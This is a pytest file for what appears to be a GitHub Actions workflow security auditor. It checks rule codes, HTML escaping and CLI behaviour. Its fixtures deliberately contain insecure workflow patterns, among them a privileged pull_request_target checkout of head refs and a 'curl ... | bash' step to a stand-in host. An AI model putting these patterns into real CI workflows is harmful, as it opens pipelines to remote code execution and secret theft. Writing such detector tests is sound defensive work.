from __future__ import annotations

import json
from pathlib import Path

import pytest

from workflow_sentry.advanced import audit_advanced, trigger_names
from workflow_sentry.cli import main
from workflow_sentry.core import audit_document
from workflow_sentry.presentation import html_report


def test_privileged_checkout_and_artifact_chain() -> None:
    d = {
        "on": ["workflow_run", "pull_request_target"],
        "permissions": {},
        "jobs": {
            "test": {
                "steps": [
                    {
                        "uses": "actions/checkout@v4",
                        "with": {"ref": "$" + "{{ github.event.workflow_run.head_sha }}"},
                    },
                    {"uses": "actions/download-artifact@v4"},
                ]
            }
        },
    }
    codes = {f.code for f in audit_document(d)}
    assert {"WS004", "WS010", "WS011", "WS014"} <= codes
    assert trigger_names(123) == set()
    assert trigger_names("push") == {"push"}


def test_containers_remote_scripts_and_value_free_output() -> None:
    secret = "PRIVATE_TOKEN_123"
    d = {
        "on": "push",
        "permissions": {},
        "jobs": {
            "test": {
                "steps": [
                    {"uses": "docker://image:latest"},
                    {"uses": "docker://image@sha256:" + "a" * 64},
                    {"run": "curl https://example.test/" + secret + " | bash"},
                    {"run": "curl https://example.test/safe -o file"},
                    {"run": "echo safe"},
                ]
            }
        },
    }
    findings = audit_document(d)
    assert len([f for f in findings if f.code == "WS012"]) == 1
    assert len([f for f in findings if f.code == "WS013"]) == 1
    assert secret not in str(findings)


def test_adversarial_document_shapes() -> None:
    assert audit_advanced({"jobs": []}) == []
    assert (
        audit_advanced(
            {
                "jobs": {
                    "x": None,
                    "y": {"steps": {}},
                    "z": {"steps": [None, {"uses": "actions/checkout@v4", "with": []}]},
                }
            }
        )
        == []
    )
    assert audit_advanced(
        {
            "on": {"pull_request_target": None},
            "jobs": {
                "x": {
                    "steps": [
                        {
                            "uses": "actions/checkout@v4",
                            "with": {"ref": "$" + "{{ github.head_ref }}"},
                        }
                    ]
                }
            },
        }
    )


def test_html_escapes_sources_and_reports_review_state() -> None:
    html = html_report(
        [
            {
                "source": "<script>private</script>",
                "findings": [
                    {
                        "severity": "high",
                        "code": "WS013",
                        "location": "run",
                        "message": "<unsafe>",
                        "suppressed": True,
                    }
                ],
            }
        ],
        {"new": ["x"], "unchanged": [], "resolved": []},
    )
    assert "<script>" not in html and "&lt;script&gt;" in html
    assert "Suggested review" in html and "reviewed exception" in html
    assert "<tbody></tbody>" in html_report([], {})


def test_cli_root_exclusions_baselines_and_new_only(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    f = tmp_path / "ci.yml"
    f.write_text(
        "permissions: {}\njobs:\n  test:\n    steps:\n      - uses: docker://image:latest\n"
    )
    baseline = tmp_path / "baseline.json"
    assert (
        main(
            [
                str(f),
                "--root",
                str(tmp_path),
                "--format",
                "json",
                "--output",
                str(baseline),
                "--fail-on",
                "medium",
            ]
        )
        == 1
    )
    data = json.loads(baseline.read_text())
    assert data["reports"][0]["source"] == "ci.yml"
    assert (
        main(
            [
                str(f),
                "--root",
                str(tmp_path),
                "--baseline",
                str(baseline),
                "--new-only",
                "--fail-on",
                "medium",
            ]
        )
        == 0
    )
    assert main([str(f), "--new-only"]) == 2
    assert main(["--list-rules"]) == 0
    assert "WS014" in capsys.readouterr().out
    assert main([str(f), "--root", str(tmp_path), "--format", "html"]) == 0
    with pytest.raises(SystemExit):
        main([str(f), "--root", str(tmp_path), "--exclude", "ci.yml"])
    assert main([str(f), "--root", str(tmp_path / "other")]) == 2
    assert main([str(f), "--format", "json"]) == 0
    assert f.read_text().startswith("permissions: {}")
